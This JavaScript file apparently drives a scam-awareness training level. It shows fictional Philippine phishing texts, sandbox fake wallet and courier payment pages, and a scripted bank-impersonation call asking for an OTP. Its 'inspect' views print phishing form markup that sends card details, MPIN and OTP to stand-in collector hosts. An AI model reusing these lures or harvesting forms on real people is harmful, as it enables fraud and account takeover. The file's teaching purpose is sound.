/* Cyberity — Your Phone, One Week (level 304).
 * Local only. Fictional senders and numbers; nothing sends, dials or loads.
 */

var Cyberity = (function () {
  function safe(fn) {
    try { if (typeof AndroidLab !== 'undefined') fn(); } catch (e) { /* preview */ }
  }
  return {
    clueFound: function (id) { safe(function () { AndroidLab.notifyClueFound(id); }); },
    flagDiscovered: function (token) { safe(function () { AndroidLab.notifyFlagDiscovered(token); }); }
  };
})();

var Store = {
  KEY: 'sms_read',
  raw: function () {
    var raw = null;
    try { raw = window.sessionStorage.getItem(Store.KEY); } catch (e) { raw = null; }
    if (raw === null) {
      var tag = Store.KEY + '=';
      raw = window.name.indexOf(tag) === 0 ? window.name.substring(tag.length) : '';
    }
    return raw || '';
  },
  has: function (id) { return Store.raw().split(',').indexOf(id) !== -1; },
  mark: function (id) {
    if (Store.has(id)) return;
    var ids = Store.raw().split(',').filter(function (s) { return s.length > 0; });
    ids.push(id);
    var raw = ids.join(',');
    try { window.sessionStorage.setItem(Store.KEY, raw); } catch (e) { /* ignored */ }
    window.name = Store.KEY + '=' + raw;
  }
};

function escapeHtml(text) {
  return String(text)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;')
    .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

/* ---------------------------------------------------------------------------
 * The four threads
 *
 * Messages are `them` unless marked `us`. A message may carry:
 *   link    { label, real, page }  — opens a sandbox page
 *   details { rows, hot, note }    — long-press → DETAILS
 * ------------------------------------------------------------------------ */
var THREADS = {
  s1: {
    id: 's1', name: 'GCASH', sub: 'Sender ID · 3 messages', when: 'Today 19:42',
    preview: 'Your account has been temporarily limited...',
    messages: [
      {
        time: 'Mon 08:14',
        text: 'You have received PHP 500.00 from JUAN D. Ref. No. 0041 8827 1193. ' +
          'Your new balance is PHP 1,238.50.',
        details: {
          rows: [
            'sender ID  : GCASH',
            'route      : wallet notification gateway (registered aggregator)',
            'category   : transactional receipt',
            'links      : none'
          ],
          ok: [1],
          note: 'A genuine receipt: it tells you something and asks for nothing.'
        }
      },
      {
        time: 'Wed 17:02',
        text: 'You have sent PHP 220.00 to MARIA S. Ref. No. 0041 9930 4417. ' +
          'Your new balance is PHP 1,018.50.',
        details: {
          rows: [
            'sender ID  : GCASH',
            'route      : wallet notification gateway (registered aggregator)',
            'category   : transactional receipt',
            'links      : none'
          ],
          ok: [1]
        }
      },
      {
        time: 'Today 19:42',
        scam: true,
        text: 'GCash Alert: Your account has been temporarily limited due to unusual login. ' +
          'Re-verify within 12 hours to avoid permanent closure: hxxps://gcash-verify.reactivate-ph.example/u',
        link: { label: 'hxxps://gcash-verify.reactivate-ph.example/u', page: 'gcash' },
        detailsClue: 'message_details_s1',
        details: {
          rows: [
            'sender ID  : GCASH   <- label set by the sender',
            'route      : bulk SMS broadcaster, unregistered',
            'category   : promotional / bulk',
            'links      : 1 · reactivate-ph.example · registered 6 days ago',
            '',
            'your phone groups messages by sender ID only.',
            'it does not check who set that ID.'
          ],
          hot: [0, 1, 3],
          warn: [6],
          note: 'Same label, completely different route. The thread proves nothing.'
        }
      }
    ]
  },

  s2: {
    id: 's2', name: '+63 917 442 8810', sub: 'Unknown number', when: 'Today 11:07',
    preview: 'CONGRATULATIONS! Ang inyong numero ay napili...',
    messages: [
      {
        time: 'Today 11:07',
        scam: true,
        text: 'CONGRATULATIONS KEN! Ang inyong numero ay napili sa 2026 Anniversary Raffle. ' +
          'Panalo kayo ng PHP 850,000.00 at isang motor. Ref: ANV-2026-4471.\n\n' +
          'Para ma-claim, i-text ang inyong Full Name, Address at Birthday, at magpadala ng ' +
          'PHP 1,500 processing fee sa GCash number na ito. Refundable po ito kasama ng prize.',
        details: {
          rows: [
            'from       : +63 917 442 8810 (personal number)',
            'route      : ordinary SMS',
            'links      : none — the ask is a reply and a payment',
            'your name  : "KEN" — from a leaked list, not from the raffle'
          ],
          hot: [0, 2]
        }
      }
    ]
  },

  s3: {
    id: 's3', name: 'JRS-EXPRESS', sub: 'Sender ID · courier', when: 'Today 09:26',
    preview: 'Your parcel is on hold pending a release fee...',
    messages: [
      {
        time: 'Today 09:26',
        scam: true,
        text: 'Your parcel PH8841-22 is on hold at the sorting facility pending a release fee ' +
          'of PHP 195.00. Settle within 24 hours or the item will be returned to sender: ' +
          'hxxps://jrs-tracking.parcel-release.example/pay',
        link: { label: 'hxxps://jrs-tracking.parcel-release.example/pay', page: 'parcel' },
        details: {
          rows: [
            'sender ID  : JRS-EXPRESS   <- label set by the sender',
            'route      : bulk SMS broadcaster',
            'links      : 1 · parcel-release.example · registered 11 days ago',
            'amount     : small enough to pay without checking'
          ],
          hot: [0, 2]
        }
      }
    ]
  },

  s4: {
    id: 's4', name: '+63 995 118 2274', sub: 'Unknown number', when: 'Yesterday 21:15',
    preview: 'Good evening! Home-based part time po...',
    messages: [
      {
        time: 'Yesterday 21:15',
        scam: true,
        text: 'Good evening! Home-based part time po, 1-2 hours lang araw-araw. ' +
          'PHP 1,500-3,000 daily, walang experience needed, students welcome. ' +
          'Registration fee PHP 350 for the starter kit. Message me here to start today.',
        details: {
          rows: [
            'from       : +63 995 118 2274 (personal number)',
            'pattern    : pay-to-start "job", tasks then require topping up',
            'links      : none in this message; the next one asks you to move to a chat app'
          ],
          hot: [1]
        }
      }
    ]
  }
};

var ORDER = ['s1', 's2', 's3', 's4'];

/* ---------------------------------------------------------------------------
 * Message list
 * ------------------------------------------------------------------------ */

/* ---------------------------------------------------------------------------
 * Returning to the list
 *
 * Shared block: identical in every simulation apart from KEY.
 *
 * Opening an item is a full page load, so coming back drops the student at the
 * top of the list and they have to hunt for their place again. Remember which
 * item was opened and put it back under their eyes instead.
 *
 * sessionStorage only, deliberately: this is a convenience, not state the
 * level depends on, so if the WebView refuses it the list simply behaves as
 * it did before.
 * ------------------------------------------------------------------------ */
var ReturnTo = {
  KEY: 'scam_messages_last',
  remember: function (id) {
    if (!id) return;
    try { window.sessionStorage.setItem(ReturnTo.KEY, id); } catch (e) { /* ignored */ }
  },
  restore: function () {
    var id = null;
    try { id = window.sessionStorage.getItem(ReturnTo.KEY); } catch (e) { id = null; }
    if (!id) return;
    var row = document.getElementById('card-' + id) ||
      document.querySelector('[href$="#' + id + '"]');
    // Jumped, not smoothed: an animated scroll on arrival reads as the page
    // sliding away by itself.
    if (row) row.scrollIntoView({ block: 'center' });
  }
};

function renderMessages(mountId) {
  var html = ORDER.map(function (key) {
    var t = THREADS[key];
    var read = Store.has(key);
    return '' +
      '<a class="choice sms-row ' + (read ? 'read' : 'unread') +
        '" href="thread.html#' + t.id + '">' +
        '<span class="avatar">' + escapeHtml(t.name.charAt(0)) + '</span>' +
        '<span class="sms-body">' +
          '<span class="sms-top">' +
            '<span class="sms-name">' + escapeHtml(t.name) + '</span>' +
            '<span class="sms-when">' + escapeHtml(t.when) + '</span>' +
          '</span>' +
          '<span class="sms-sub">' + escapeHtml(t.sub) + '</span>' +
          '<span class="sms-prev">' + escapeHtml(t.preview) + '</span>' +
          '<span class="mail-badge">' + (read ? 'READ' : 'NOT READ YET') + '</span>' +
        '</span>' +
      '</a>';
  }).join('');
  document.getElementById(mountId).innerHTML = html;

  var left = ORDER.filter(function (k) { return !Store.has(k); }).length;
  var counter = document.getElementById('unread-count');
  if (counter) {
    counter.textContent = left === 0 ? 'All four read' : left + ' of 4 unread';
  }

  ReturnTo.restore();
}

/* ---------------------------------------------------------------------------
 * Thread view
 * ------------------------------------------------------------------------ */
function renderThread(mountId) {
  ReturnTo.remember((window.location.hash || '').substring(1));
  var key = (window.location.hash || '#s1').substring(1);
  var t = THREADS[key] || THREADS.s1;

  Store.mark(t.id);
  Cyberity.clueFound('thread_opened_' + t.id);

  var html =
    '<div class="artifact a-msg">' +
      '<span class="artifact-tag">SMS &middot; ' + escapeHtml(t.sub).toUpperCase() + '</span>' +
      '<div class="thread">' + t.messages.map(function (m, i) {
    var body = escapeHtml(m.text).replace(/\n/g, '<br>');
    if (m.link) {
      body = body.replace(escapeHtml(m.link.label),
        '<a class="sms-link" href="site.html#' + m.link.page + '">' +
        escapeHtml(m.link.label) + '</a>');
    }
    return '<div class="sms-msg">' +
        '<div class="sms-time">' + escapeHtml(m.time) + '</div>' +
        '<div class="sms-bubble">' + body + '</div>' +
        '<button class="sms-details-btn" onclick="showDetails(\'' + key + '\', ' + i + ')">' +
          'LONG-PRESS · DETAILS</button>' +
        '<div class="sms-details" id="det-' + i + '"></div>' +
      '</div>';
  }).join('') + '</div></div>';

  html += '<div class="reply-bar">' +
      '<span class="reply-box">Type a message…</span>' +
      '<button class="reply-send" onclick="replyToScam()">SEND</button>' +
    '</div>' +
    '<div class="banner" id="reply-banner"></div>';

  document.getElementById(mountId).innerHTML = html;
  document.getElementById('thread-name').textContent = t.name;
  window.scrollTo(0, 0);
}

function renderRows(ev) {
  return ev.rows.map(function (line, i) {
    var cls = '';
    if (ev.hot && ev.hot.indexOf(i) !== -1) cls = 'hot';
    if (ev.ok && ev.ok.indexOf(i) !== -1) cls = 'ok';
    if (ev.warn && ev.warn.indexOf(i) !== -1) cls = 'warn';
    var safe = escapeHtml(line);
    return cls ? '<span class="' + cls + '">' + safe + '</span>' : safe;
  }).join('\n');
}

function showDetails(threadKey, index) {
  var m = THREADS[threadKey].messages[index];
  var box = document.getElementById('det-' + index);
  if (!m.details || box.innerHTML) return;
  box.innerHTML =
    '<div class="det-title">MESSAGE DETAILS</div>' +
    '<div class="rows">' + renderRows(m.details) + '</div>' +
    (m.details.note ? '<div class="note">' + escapeHtml(m.details.note) + '</div>' : '');
  if (m.detailsClue) Cyberity.clueFound(m.detailsClue);
}

/** Dangerous: any reply confirms the number is live. */
function replyToScam() {
  var banner = document.getElementById('reply-banner');
  banner.className = 'banner show bad';
  banner.textContent = 'Blocked by the simulation. Replying — even "STOP" or "who is this?" — ' +
    'tells the sender a real person reads this number. Confirmed numbers get sold on, so one ' +
    'reply usually means more scam texts, not fewer. Block and report instead.';
  banner.scrollIntoView({ behavior: 'smooth', block: 'center' });
  Cyberity.clueFound('replied_to_scam');
}

/* ---------------------------------------------------------------------------
 * Sandbox pages behind the links
 * ------------------------------------------------------------------------ */
var SITES = {
  parcel: {
    back: 's3',
    url: 'hxxps://jrs-tracking.parcel-release.example/pay',
    owner: 'parcel-release.example',
    ownerNote: 'Registered 11 days ago. The courier\'s real site is not part of it.',
    clue: 'parcel_page_opened',
    brand: 'JRS Express · Parcel Release',
    accent: '#b8232f',
    title: 'Release fee: PHP 195.00',
    note: 'Parcel PH8841-22 · held at sorting facility',
    fields: [
      { label: 'Card number', type: 'tel', placeholder: '0000 0000 0000 0000' },
      { label: 'Expiry', type: 'tel', placeholder: 'MM/YY' },
      { label: 'CVV', type: 'password', placeholder: '000' }
    ],
    button: 'Pay PHP 195.00',
    warning: 'Blocked by the simulation. The page displays ₱195 but collects the full card ' +
      'number, expiry and CVV — everything needed to charge it again and again. Couriers here ' +
      'do not take release fees through a texted link.',
    inspect: [
      '&lt;form method="POST"',
      '<span class="hot">      action="hxxps://collect.parcel-release.example/c.php"&gt;</span>',
      '  &lt;input name="card"&gt;   &lt;input name="exp"&gt;   &lt;input name="cvv"&gt;',
      '<span class="hot">  &lt;input type="hidden" name="kit" value="CYBERITY{p4rc3l_n3v3r_s3nt}"&gt;</span>',
      '  &lt;input type="hidden" name="amount" value="195"&gt;',
      '<span class="warn">  &lt;input type="hidden" name="charge_after" value="8900"&gt;</span>',
      '&lt;/form&gt;'
    ],
    inspectNote: 'The displayed amount is ₱195. The hidden field queues a second charge of ' +
      '₱8,900 once the card is confirmed working.',
    inspectClue: 'parcel_page_inspected'
  },
  gcash: {
    back: 's1',
    url: 'hxxps://gcash-verify.reactivate-ph.example/u',
    owner: 'reactivate-ph.example',
    ownerNote: 'Registered 6 days ago. Nothing to do with the wallet.',
    clue: 'gcash_page_opened',
    brand: 'GCash · Account Verification',
    accent: '#0b6b2e',
    title: 'Re-verify your account',
    note: 'Limited access · 11 hours 42 minutes remaining',
    fields: [
      { label: 'Mobile number', type: 'tel', placeholder: '09XX XXX XXXX' },
      { label: 'MPIN', type: 'password', placeholder: '••••' },
      { label: 'OTP sent to your phone', type: 'tel', placeholder: '6 digits' }
    ],
    button: 'Re-verify now',
    warning: 'Blocked by the simulation. Mobile number, MPIN and the OTP together are a ' +
      'complete takeover — the countdown exists only to stop you checking. The wallet never ' +
      'asks for your MPIN or OTP on a web page.',
    inspect: [
      '&lt;form method="POST"',
      '<span class="hot">      action="hxxps://collect.reactivate-ph.example/w.php"&gt;</span>',
      '  &lt;input name="msisdn"&gt;  &lt;input name="mpin"&gt;  &lt;input name="otp"&gt;',
      '<span class="warn">  &lt;input type="hidden" name="then" value="https://www.gcash.com"&gt;</span>',
      '&lt;/form&gt;'
    ],
    inspectNote: 'After submission the page forwards you to the real wallet site, so the ' +
      'theft looks like a page that simply failed to load.'
  }
};

function renderSite(mountId) {
  var key = (window.location.hash || '#parcel').substring(1);
  var site = SITES[key] || SITES.parcel;
  window.currentSite = key;

  if (site.clue) Cyberity.clueFound(site.clue);

  var fields = site.fields.map(function (f) {
    return '<label class="fake-label">' + escapeHtml(f.label) + '</label>' +
      '<input class="fake-input" type="' + f.type + '" placeholder="' + escapeHtml(f.placeholder) +
      '" autocomplete="off">';
  }).join('');

  document.getElementById(mountId).innerHTML =
    '<div class="url-bar">' +
      '<div class="url-label">Address of the page you are on</div>' +
      '<div class="mono url-text">' + escapeHtml(site.url) + '</div>' +
      '<div class="url-note">Site owner: <b>' + escapeHtml(site.owner) + '</b><br>' +
        escapeHtml(site.ownerNote) + '</div>' +
    '</div>' +
    '<div class="artifact a-web">' +
      '<span class="artifact-tag">WEB PAGE &middot; SANDBOX</span>' +
      '<div class="fake-page">' +
      '<div class="fake-bar" style="background:' + site.accent + ';color:#ffffff">' +
        escapeHtml(site.brand) + '</div>' +
      '<div class="fake-inner">' +
        '<div class="fake-head">' + escapeHtml(site.title) + '</div>' +
        '<div class="fake-title">' + escapeHtml(site.note) + '</div>' +
        fields +
        '<button class="fake-btn" style="background:' + site.accent + '" ' +
          'onclick="payNow()">' + escapeHtml(site.button) + '</button>' +
      '</div>' +
    '</div></div>' +
    '<div class="banner" id="site-banner"></div>' +
    '<button class="cta" onclick="inspectSite()">INSPECT PAGE</button>' +
    '<div class="evidence" id="site-source"></div>' +
    '<div class="note">In this lab, opening a link is safe. On your own phone it is not: ' +
      'check a link before tapping, and reach your bank or wallet through the app you ' +
      'installed yourself.</div>';

  var back = document.getElementById('back-link');
  if (back) back.setAttribute('onclick', "location.href='thread.html#" + site.back + "'");
  var title = document.getElementById('site-owner');
  if (title) title.textContent = site.owner;
}

/** Dangerous: handing over card details or wallet credentials. */
function payNow() {
  var site = SITES[window.currentSite] || SITES.parcel;
  var banner = document.getElementById('site-banner');
  banner.className = 'banner show bad';
  banner.textContent = site.warning;
  banner.scrollIntoView({ behavior: 'smooth', block: 'center' });
  Cyberity.clueFound('card_entered');
}

function inspectSite() {
  var site = SITES[window.currentSite] || SITES.parcel;
  var box = document.getElementById('site-source');
  if (box.classList.contains('open')) return;
  box.className = 'evidence open';
  box.innerHTML =
    '<div class="evidence-head"><span>' +
      '<span class="evidence-name">Page code · payment form</span>' +
      '<span class="evidence-sub">Where the typed details are sent</span>' +
    '</span></div>' +
    '<div class="evidence-body">' +
      '<div class="rows">' + site.inspect.join('\n') + '</div>' +
      '<div class="note">' + escapeHtml(site.inspectNote) + '</div>' +
    '</div>';
  box.scrollIntoView({ behavior: 'smooth', block: 'start' });
  if (site.inspectClue) {
    Cyberity.clueFound(site.inspectClue);
    Cyberity.flagDiscovered('payment_form');
  }
}

/* ---------------------------------------------------------------------------
 * The recorded call
 * ------------------------------------------------------------------------ */
var CALL = [
  { who: 'them', name: 'Caller', text: 'Good afternoon, am I speaking with Ken Mendoza? This ' +
    'is Allan from the BPI Fraud Department.' },
  { who: 'us', name: 'You', text: 'Yes, why?' },
  { who: 'them', name: 'Caller', text: 'Sir, we flagged a transaction on your card ending 4417 ' +
    '— eight thousand nine hundred pesos at an online merchant, twenty minutes ago. Did you ' +
    'authorise that?' },
  { who: 'us', name: 'You', text: 'No, I didn\'t.' },
  { who: 'them', name: 'Caller', text: 'That is what we suspected, sir. I can reverse it, but ' +
    'the window closes in ten minutes once it settles. I am sending a verification code to your ' +
    'number now — please read it back to me so I can cancel the transaction.' },
  { who: 'us', name: 'You', text: 'You\'re asking for the code from my phone?' },
  { who: 'them', name: 'Caller', text: 'Only to confirm your identity, sir, it is standard for ' +
    'fraud reversal. If we cannot verify, the amount is debited and refund takes forty-five ' +
    'days. Please, sir, the code.' },
  { who: 'them', name: 'Caller', text: 'Sir? Are you still there? I am trying to save your ' +
    'money here.' }
];

var callIndex = 0;

function renderCall(mountId) {
  var lines = CALL.slice(0, callIndex + 1).map(function (m) {
    return '<div class="bubble-row ' + m.who + '">' +
      '<div class="bubble"><div class="bubble-name">' + escapeHtml(m.name) + '</div>' +
      escapeHtml(m.text) + '</div></div>';
  }).join('');

  var done = callIndex >= CALL.length - 1;

  document.getElementById(mountId).innerHTML =
    '<div class="call-card">' +
      '<div class="call-who">BPI Fraud Department</div>' +
      '<div class="call-num mono">+63 2 8888 1234 · incoming · 1 min 12 s</div>' +
      '<div class="call-note">Recorded by the campus phone. Caller ID can be set to any ' +
        'number, so the name above proves nothing.</div>' +
    '</div>' +
    '<div class="chat">' + lines + '</div>' +
    (done
      ? '<div class="banner show warn">End of recording. He never says which branch, and every ' +
        'detail he "knows" is printed on a receipt.</div>'
      : '<button class="cta" onclick="playNext()">PLAY NEXT LINE</button>');

  if (done) Cyberity.clueFound('call_played');
}

function playNext() {
  callIndex = Math.min(CALL.length - 1, callIndex + 1);
  renderCall('detail');
  window.scrollTo(0, document.body.scrollHeight);
}
